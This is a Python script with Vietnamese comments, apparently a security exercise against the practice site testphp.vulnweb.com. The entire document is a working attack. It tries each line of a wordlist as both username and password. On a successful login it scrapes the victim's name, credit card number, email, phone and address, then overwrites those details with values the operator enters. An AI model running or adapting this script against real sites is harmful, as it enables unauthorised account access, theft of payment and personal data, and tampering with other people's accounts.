import requests
from bs4 import BeautifulSoup

# URL đăng nhập
login_url = 'http://testphp.vulnweb.com/userinfo.php'
session = requests.Session()
# Đọc dữ liệu đăng nhập từ file
with open('dangnhap.txt', 'r') as f:
    lines = f.readlines()
    for line in lines:
        # Tách tên người dùng và mật khẩu từ dòng đọc được
        username = password = line.strip()
        # Dữ liệu đăng nhập
        data = {
            'uname': username,
            'pass': password
        }
        # Gửi yêu cầu POST đăng nhập
        response = session.post(login_url, data=data)
        soup = BeautifulSoup(response.content, "html.parser")
        # Kiểm tra kết quả
        if "user info" in soup.title.text:
            print(f'-------------------------- Đăng nhập thành công -----------------------------------')
            print('tên đăng nhập : ',username)

            # Trích xuất URL mới từ phản hồi của yêu cầu POST đăng nhập
            soup = BeautifulSoup(response.text, 'html.parser')
            html_content = soup.prettify()
            name = soup.find("input",{"name":"urname"})['value']
            credits = soup.find("input",{"name":"ucc"})['value']
            email = soup.find("input",{"name":"uemail"})['value']
            phone = soup.find("input",{"name":"uphone"})['value']
            address = soup.find("textarea",{"name":"uaddress"}).text
            # print(f'Nội dung trang web:\n{html_content}')
            print('Name:', name)
            print('Credit card number:', credits)
            print('E-Mail:', email)
            print('Phone number:', phone)
            print('Address:', address)


            # Dữ liệu mới để cập nhật
            new_name = input("Nhập tên mới: ")
            new_cc_number = input("Nhập số thẻ tín dụng mới: ")
            new_email = input("Nhập email mới: ")
            new_phone = input("Nhập số điện thoại mới: ")
            new_address = input("Nhập địa chỉ mới: ")

            # Tạo payload để gửi dữ liệu lên server
            payload = {
                'urname': new_name,
                'ucc': new_cc_number,
                'uemail': new_email,
                'uphone': new_phone,
                'uaddress': new_address,
                'update': 'update'  # Giá trị của nút "update"
            }
            # Gửi request POST để cập nhật dữ liệu
            response = session.post(login_url, data=payload)
            if response.status_code == 200:
                print('-------------------------------------------------------------------------------')
                print('Thông tin đã được cập nhật thành công.')
                soup = BeautifulSoup(response.text, 'html.parser')
                html_content = soup.prettify()
                name = soup.find("input",{"name":"urname"})['value']
                credits = soup.find("input",{"name":"ucc"})['value']
                email = soup.find("input",{"name":"uemail"})['value']
                phone = soup.find("input",{"name":"uphone"})['value']
                address = soup.find("textarea",{"name":"uaddress"}).text
                print('Name:', name)
                print('Credit card number:', credits)
                print('E-Mail:', email)
                print('Phone number:', phone)
                print('Address:', address)
            else:
                print('Có lỗi xảy ra khi cập nhật thông tin.')
                break
        else:
            print(f'-------------------------- Đăng nhập không thành công ------------------------------')
            print('tên đăng nhập : ',username)


